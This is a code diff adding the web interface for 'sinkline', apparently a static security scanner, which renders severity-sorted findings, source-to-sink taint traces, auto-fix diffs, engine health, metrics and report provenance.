+    text += `<text x="${x - 3}" y="${Y - 17}" font-family="${MONO}" font-size="9" font-weight="700"
+             letter-spacing="1.7" fill="${col}">${LABELS[i]}</text>`;
+    wrap(body, 32, 4).forEach((ln, li) => {
+      text += `<text x="${x - 3}" y="${Y + 25 + li * 15}" font-family="${SANS}" font-size="11.5" fill="${cv("--body")}">${esc(ln)}</text>`;
+    });
+  }
+  // the wire cools at the source and heats into the sink — same ramp as the severity chips
+  const wire = len
+    ? `<line class="wire" x1="${X0}" y1="${Y}" x2="${X0 + len - 7}" y2="${Y}" stroke="url(#ramp${id})"
+        stroke-width="1.5" style="--len:${len}"/>` : "";
+  return `<div class="trace"><svg viewBox="0 0 ${W} ${H}" width="${W}" height="${H}" role="img"
+      aria-label="Taint path from source to sink">
+      <defs><linearGradient id="ramp${id}" gradientUnits="userSpaceOnUse" x1="${X0}" y1="${Y}" x2="${X0 + len}" y2="${Y}">
+        <stop offset="0" stop-color="${cool}"/><stop offset="1" stop-color="${hot}"/></linearGradient></defs>
+      ${wire}${marks}${text}</svg></div>`;
+}
+
+/* ---------- result views ---------- */
+// Lead with the worst: severity rank, then file, then line.
+const bySeverity = (a, b) =>
+  ORDER.indexOf(a.severity) - ORDER.indexOf(b.severity) ||
+  String(a.artifact_uri || "").localeCompare(String(b.artifact_uri || "")) ||
+  (a.line || 0) - (b.line || 0);
+
+function renderTabs(r){
+  const graphable = r.findings.filter(f => (f.narrative || []).length >= 2).sort(bySeverity);
+  const nfix = (r.fixes && r.fixes.count) || 0;
+  const defs = [["findings","findings", r.findings.length], ["flow","attack paths", graphable.length],
+                ["fixes","auto-fix", nfix], ["engines","engines", r.health.length],
+                ["metrics","metrics", null], ["prov","provenance", null]];
+  $("#rtabs").innerHTML = defs.map((t, i) =>
+      `<button role="tab" aria-selected="${i === 0}" data-p="${t[0]}">${t[1]}${t[2] != null ? `<span class="n">${t[2]}</span>` : ""}</button>`
+    ).join("") +
+    `<span style="margin-left:auto;display:flex;gap:8px;padding:7px 10px;align-items:center">
+      <button class="ghost" id="dlJson" style="padding:4px 10px;font-size:10.5px">JSON</button>
+      <button class="ghost" id="dlSarif" style="padding:4px 10px;font-size:10.5px">SARIF</button></span>`;
+  $$("#rtabs button[role=tab]").forEach(b => b.onclick = () => {
+    $$("#rtabs button[role=tab]").forEach(x => x.setAttribute("aria-selected", String(x === b)));
+    $$(".pane").forEach(p => p.removeAttribute("data-open"));
+    $("#pane-" + b.dataset.p).setAttribute("data-open", "");
+  });
+  $("#dlJson").onclick = () => lastResp && download("sinkline-report.json", lastResp.json);
+  $("#dlSarif").onclick = () => lastResp && download("sinkline.sarif", lastResp.sarif);
+
+  /* attack paths — the signature view */
+  $("#pane-flow").innerHTML = graphable.length
+    ? `<p class="lede">One line per finding: where the data starts, what carries it, where it lands.
+       Cross-file flows show the hop between modules.</p>` +
+      graphable.map((f, i) => `<article class="fnd" style="border-left-color:${sevColor(f.severity)}">
+        <div class="fhead"><span class="sev sev-${f.severity}">${f.severity}</span><h3>${esc(f.title)}</h3></div>
+        <div class="fmeta"><a href="${esc(f.cwe_uri)}" target="_blank" rel="noopener">${esc(f.cwe)}</a>
+          <span>${esc(f.artifact_uri)}:${f.line}</span></div>
+        ${sinklineTrace(f, i)}
+        ${f.evidence && f.evidence.length ? `<div class="evid">${esc(f.evidence.join("\n"))}</div>` : ""}
+      </article>`).join("")
+    : `<div class="empty">No traced paths in this scan.</div>`;
+
+  /* engines */
+  $("#pane-engines").innerHTML = `<p class="lede">Each engine runs behind a resilience wrapper. If one fails it degrades
+    and reports here — the scan still returns.</p><div class="grid">` +
+    r.health.map(h => `<div class="cell"><div class="n">${esc(h.name)}</div>
+      <div class="s">${esc(h.state)}${h.detail ? " · " + esc(h.detail) : ""}${h.failures ? ` · ${h.failures} failure(s)` : ""}</div>
+    </div>`).join("") + `</div>`;
+
+  /* metrics */
+  const p = r.physics || {};
+  const core = [["Symbolic reachability", r.symbolic],
+                ["AST entropy", r.summary.ast_entropy],
+                ["Dangerous sinks located", (r.sinks || []).length]];
+  const aux = [["Von Neumann / quantum discord", p.quantum_discord != null ? p.quantum_discord : "—"],
+               ["Landauer ratio", p.landauer_ratio != null ? p.landauer_ratio : "—"],
+               ["Least-action deviation", p.action_hamiltonian != null ? p.action_hamiltonian : "—"]];
+  $("#pane-metrics").innerHTML =
+    `<span class="eyebrow">Detection signals</span>` +
+    core.map(x => `<div class="kv"><span>${esc(x[0])}</span><b>${esc(x[1])}</b></div>`).join("") +
+    ((r.sinks || []).length ? `<div style="margin-top:12px;font-size:12.5px;color:var(--muted)">Sinks located: ` +
+      r.sinks.map(s => `<code class="k">${esc(s.name)}:${s.line}${s.guarded ? " (guarded)" : ""}</code>`).join(" ") + `</div>` : "") +
+    `<div class="subhead"><span class="eyebrow">Auxiliary heuristics — recorded, never decisive</span></div>` +
+    aux.map(x => `<div class="kv dim"><span>${esc(x[0])}</span><b>${esc(x[1])}</b></div>`).join("");
+
+  /* provenance */
+  const pv = r.provenance || {};
+  $("#pane-prov").innerHTML =
+    `<div class="kv"><span>Report SHA-256</span><b style="font-size:11.5px">${esc((pv.report_sha256 || "").slice(0, 40))}…</b></div>
+     <p class="lede" style="margin-top:14px">This hash commits to the exact report. Append it to a hash-chained ledger with
+     <code class="k">sinkline scan . --ledger audit.ledger</code>, then verify the chain offline with
+     <code class="k">sinkline verify-ledger audit.ledger</code>. No blockchain involved.</p>`;
+
+  /* auto-fix */
+  const fx = r.fixes || {count:0, fixes:[], diff:"", patched:""};
+  if (!fx.count){
+    $("#pane-fixes").innerHTML = `<div class="empty">No deterministic fix applies here.<br>
+      <span class="note">Auto-fix only rewrites what has one correct answer — weak hash, <code class="k">verify=False</code>,
+      <code class="k">yaml.load</code>, <code class="k">mktemp</code>, <code class="k">debug=True</code>.
+      Judgement calls such as SQL injection stay with you; read the fix note on each finding.</span></div>`;
+  } else {
+    $("#pane-fixes").innerHTML =
+      `<p class="lede">${fx.count} AST-anchored rewrite(s). Reproducible, no LLM. Read the diff before applying it.</p>` +
+      fx.fixes.map(f => `<article class="fnd" style="border-left-color:var(--ok)">
+        <div class="fhead"><h3>${esc(f.title)}</h3></div>
+        <div class="fmeta"><span>${esc(f.rule)}</span><span>line ${f.line}</span></div>
+        <div class="evid"><span style="color:var(--s-crit)">− ${esc(f.before)}</span><br><span style="color:var(--ok)">+ ${esc(f.after)}</span></div>
+      </article>`).join("") +
+      `<div class="controls"><button class="ghost" id="copyDiff">Copy unified diff</button>
+        <button class="ghost" id="dlPatched">Download patched .py</button></div>
+       <div class="cv" style="margin-top:12px"><div style="padding:8px 0">` +
+        fx.diff.split("\n").map(l => {
+          const c = l.startsWith("+") && !l.startsWith("+++") ? "add"
+                  : l.startsWith("-") && !l.startsWith("---") ? "del" : "ctx";
+          return `<div class="diff ${c}">${esc(l) || " "}</div>`;
+        }).join("") + `</div></div>`;
+    $("#copyDiff").onclick = e => {
+      if (navigator.clipboard) navigator.clipboard.writeText(fx.diff);
+      e.target.textContent = "Copied";
+    };
+    $("#dlPatched").onclick = () => download("patched.py", fx.patched);
+  }
+}
+
+/* ---------- findings + triage ---------- */
+function renderFindings(){
+  const r = lastResp; if (!r) return;
+  const all = r.findings;
+  const present = ORDER.filter(k => all.some(f => f.severity === k));
+  const chips = ["All", ...present].map(s =>
+    `<button class="chip" data-sev="${s}" aria-pressed="${filters.sev === s}"
+      ${s !== "All" ? `style="border-left:3px solid ${sevColor(s)}"` : ""}>${s.toLowerCase()}</button>`).join("");
+  const nIgnored = all.filter(f => ignored.has(f.fingerprint)).length;
+  const visible = all
+    .filter(f => !ignored.has(f.fingerprint))
+    .filter(f => filters.sev === "All" || f.severity === filters.sev)
+    .filter(f => !filters.hideLow || f.confidence !== "Low")
+    .sort(bySeverity);
+
+  const tools = `<div class="ftools">${chips}
+    <label><input type="checkbox" id="hideLow" ${filters.hideLow ? "checked" : ""}/> hide low confidence</label>
+    <label><input type="checkbox" id="grp" ${filters.group ? "checked" : ""}/> group by file</label>
+    <span class="shown">${visible.length} of ${all.length} · worst first${nIgnored ? ` · ${nIgnored} ignored · <button class="disclose" id="unIgnore" style="font-size:11px;padding:0">restore</button>` : ""}</span></div>`;
+
+  let body;
+  if (!visible.length){
+    body = `<div class="empty">${all.length ? "Nothing matches this filter." : "Clean — no actionable findings."}</div>`;
+  } else if (filters.group){
+    const byFile = {};
+    visible.forEach(f => { (byFile[f.artifact_uri || "snippet"] ??= []).push(f); });
+    body = Object.keys(byFile).sort().map(uri =>
+      `<div class="subhead"><span class="eyebrow">${esc(uri)} · ${byFile[uri].length}</span></div>` +
+      byFile[uri].map(card).join("")).join("");
+  } else {
+    body = visible.map(card).join("");
+  }
+  $("#pane-findings").innerHTML = tools + body;
+
+  $$(".chip").forEach(c => c.onclick = () => { filters.sev = c.dataset.sev; renderFindings(); });
+  const hl = $("#hideLow"); if (hl) hl.onchange = () => { filters.hideLow = hl.checked; renderFindings(); };
+  const g = $("#grp"); if (g) g.onchange = () => { filters.group = g.checked; renderFindings(); };
+  const un = $("#unIgnore"); if (un) un.onclick = () => { ignored.clear(); saveIgnored(); renderFindings(); };
+  wire();
+}
+
+function card(f){
+  const off = ignored.has(f.fingerprint);
+  const jumpable = scanCode && (f.artifact_uri === "snippet" || !f.artifact_uri);
+  const steps = (f.narrative || []).map(s => {
+    const label = (s.split("—")[0] || "").trim();
+    const rest = (s.split("—").slice(1).join("—") || "").trim();
+    return `<div class="step"><span>${esc(label)}</span><span>${esc(rest)}</span></div>`;
+  }).join("");
+  return `<article class="fnd ${off ? "muted" : ""}" style="border-left-color:${sevColor(f.severity)}">
+    <div class="fhead">
+      <span class="sev sev-${f.severity}">${f.severity}</span>
+      <h3>${esc(f.title)}</h3>
+      <span class="fbtn"><button data-ignore="${f.fingerprint}">${off ? "restore" : "ignore"}</button></span>
+    </div>
+    <div class="fmeta">
+      <a href="${esc(f.cwe_uri)}" target="_blank" rel="noopener">${esc(f.cwe)}</a>
+      <span>CVSS ${f.cvss}</span>
+      <span>confidence ${esc(f.confidence).toLowerCase()}</span>
+      ${jumpable ? `<button class="loc" data-jump="${f.line}">${esc(f.artifact_uri)}:${f.line}</button>`
+                 : `<span>${esc(f.artifact_uri)}:${f.line}</span>`}
+    </div>
+    <p>${esc(f.description)}</p>
+    ${f.evidence && f.evidence.length ? `<div class="evid">${esc(f.evidence.join("\n"))}</div>` : ""}
+    <div class="rem"><b>Fix:</b> ${esc(f.remediation)}</div>
+    ${steps ? `<button class="disclose" data-story>+ how the attack runs</button><div class="story">${steps}</div>` : ""}
+  </article>`;
+}
+
+function wire(){
+  $$("[data-jump]").forEach(b => b.onclick = () => jumpTo(+b.dataset.jump));
+  $$("[data-ignore]").forEach(b => b.onclick = () => {
+    const fp = b.dataset.ignore;
+    ignored.has(fp) ? ignored.delete(fp) : ignored.add(fp);
+    saveIgnored(); renderFindings();
+  });
+  $$("[data-story]").forEach(d => d.onclick = () => {
+    const s = d.nextElementSibling;
+    const open = s.hasAttribute("data-open");
+    if (open) s.removeAttribute("data-open"); else s.setAttribute("data-open", "");
+    d.textContent = (open ? "+" : "−") + " how the attack runs";
+  });
+}
+
+/* ---------- init ---------- */
+$("#code").value = SAMPLES["logic bomb"];
+fetch("/health").then(r => r.json())
+  .then(d => { $("#enginePill").textContent = (d.engines || "ready").replace("ready", "engines ready"); })
+  .catch(() => { $("#enginePill").textContent = "engines ready"; });
+</script>
+</body>
+</html>
